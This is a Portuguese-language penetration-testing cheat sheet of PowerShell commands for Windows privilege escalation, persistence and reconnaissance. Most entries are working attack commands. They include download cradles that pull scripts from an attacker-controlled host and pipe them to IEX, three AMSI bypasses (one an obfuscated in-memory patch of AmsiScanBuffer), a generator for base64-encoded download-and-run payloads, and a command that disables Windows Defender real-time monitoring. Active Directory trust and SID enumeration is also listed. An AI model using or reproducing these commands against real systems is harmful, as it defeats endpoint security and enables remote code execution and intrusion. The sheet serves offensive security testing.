# powershell

#plateform/windows #target/local #cat/PRIVESC #cat/PERSIST #cat/RECON #tag/powershell 

## Download cradle
```powershell
(new-object system.net.webclient).downloadstring('http://<ip>/<script>') | IEX
```

## Obter arquivo da lixeira
```powershell
Get-ADObject -filter 'isDeleted -eq $true -and name -ne "Deleted Objects"' -includeDeletedObjects -property *
```

## Obter processo
```powershell
Get-Process
```

## Obter Proxy
```powershell
[System.Net.WebRequest]::DefaultWebProxy.GetProxy("http://<ip>/<url>")
```

## Obter modo de linguagem
```powershell
$ExecutionContext.SessionState.LanguageMode
```

## Bypass AMSI com _amsiContext_ (somente no powershell)
```powershell
$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf = @(0);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)
```

## Bypass AMSI com _AmsiInitFailed_ (somente o powershell)
```powershell
$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*InitFailed") {$f=$e}};$f.SetValue($null,$true)
```

## Bypass AMSI utilizando patching  (funciona para binrios .NET tambem)

more infos here : https://s3cur3th1ssh1t.github.io/Powershell-and-the-.NET-AMSI-Interface/

```powershell
$ZQCUW = @"
using System;
using System.Runtime.InteropServices;
public class ZQCUW {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
}
"@
Add-Type $ZQCUW
$BBWHVWQ = [ZQCUW]::LoadLibrary("$([SYstem.Net.wEBUtIlITy]::HTmldecoDE('&#97;&#109;&#115;&#105;&#46;&#100;&#108;&#108;'))")
$XPYMWR = [ZQCUW]::GetProcAddress($BBWHVWQ, "$([systeM.neT.webUtility]::HtMldECoDE('&#65;&#109;&#115;&#105;&#83;&#99;&#97;&#110;&#66;&#117;&#102;&#102;&#101;&#114;'))")
$p = 0
[ZQCUW]::VirtualProtect($XPYMWR, [uint32]5, 0x40, [ref]$p)
$TLML = "0xB8"
$PURX = "0x57"
$YNWL = "0x00"
$RTGX = "0x07"
$XVON = "0x80"
$WRUD = "0xC3"
$KTMJX = [Byte[]] ($TLML,$PURX,$YNWL,$RTGX,+$XVON,+$WRUD)[System.Runtime.InteropServices.Marshal]::Copy($KTMJX, 0, $XPYMWR, 6)
```

## Verifica PPL
```powershell
Get-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Control\Lsa -Name "RunAsPPL"
```

## Verifica a lista de permissões da aplicação
```powershell
Get-ChildItem -Path HKLM:\SOFTWARE\Policies\Microsoft\Windows\SrpV2\Exe
```

## Exibe a confiança da floresta
```powershell
([System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()).GetAllTrustRelationships()
```

## Obter a confiaça do dominío
```powershell
Get-DomainTrust -Domain <domain>
```

## Obter SID do dominío
```powershell
Get-DomainSID -domain <sid>
```

## hostrecon
https://github.com/dafthack/HostRecon

```
(new-object system.net.webclient).downloadstring('http://<lhost>/HostRecon.ps1') | IEX; Invoke-HostRecon
```

## privesccheck
https://github.com/itm4n/PrivescCheck

```powershell
(new-object system.net.webclient).downloadstring('http://<lhost>/PrivescCheck.ps1') | IEX; Invoke-PrivescCheck
```

## powershell visualiza assemblies
```powershell
[appdomain]::currentdomain.getassemblies() | Sort-Object -Property fullname | Format-Table fullname
```

## Obter endereço do proxy via powershell
```powershell
$proxyAddr=(Get-ItemProperty -Path "HKU:$start\Software\Microsoft\Windows\CurrentVersion\Internet Settings\").ProxyServer
```

## Configurar proxy com powershell
```powershell
[system.net.webrequest]::DefaultWebProxy = new-object System.Net.WebProxy("http://<proxaddress|$proxyAddr>")
```

## powershell - Gera um payload encodado em base64 para baixar o runner
#plateform/linux #target/local #cat/PRIVESC #cat/PERSIST #cat/RECON #tag/powershell 

```powershell
pwsh -Command '$text = "(New-Object System.Net.WebClient).DownloadString(''http://<lhost>/<file>'') | IEX";$bytes = [System.Text.Encoding]::Unicode.GetBytes($text);$EncodedText = [Convert]::ToBase64String($bytes);$EncodedText'
```

## powershell - Desativa o monitoramente em tempo real (Windows Defender)
```powershell
Set-MpPreference -DisableRealtimeMonitoring $true
```
